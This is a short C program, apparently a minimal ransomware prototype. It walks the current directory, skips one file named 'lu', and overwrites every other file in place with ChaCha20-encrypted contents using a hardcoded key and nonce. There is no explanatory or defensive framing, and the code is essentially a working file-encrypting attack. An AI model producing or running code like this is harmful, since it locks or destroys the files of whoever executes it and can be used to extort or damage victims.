#include <stdio.h>
#include "chacha20.h"
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
int main() {
	unsigned char key[32] ="12345678901234567890123456789012";
	unsigned char nonce[12] ="123456789012";

	FILE *fp;
	long size;
	unsigned char *contenido;
	DIR *dir = opendir(".");
	if (dir == NULL) {
		return 1;
	}
	struct dirent *entry;

	while ((entry = readdir(dir)) != NULL) {
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
		if (strcmp(entry->d_name, "lu") == 0) {
			continue;
		}
		fp = fopen(entry->d_name, "rb+");
		fseek(fp, 0, SEEK_END);
		size = ftell(fp);
		rewind(fp);

		contenido = (unsigned char*) malloc(size + 1);
		fread(contenido, 1, size, fp);
		struct chacha20_context ctx;
		chacha20_init_context(&ctx, key, nonce, 0);
		chacha20_xor(&ctx, contenido, size);
		rewind(fp);
		fwrite(contenido, 1, size , fp);
		free(contenido);
		fclose(fp);

		
	}
	closedir(dir);
	return 0;

}


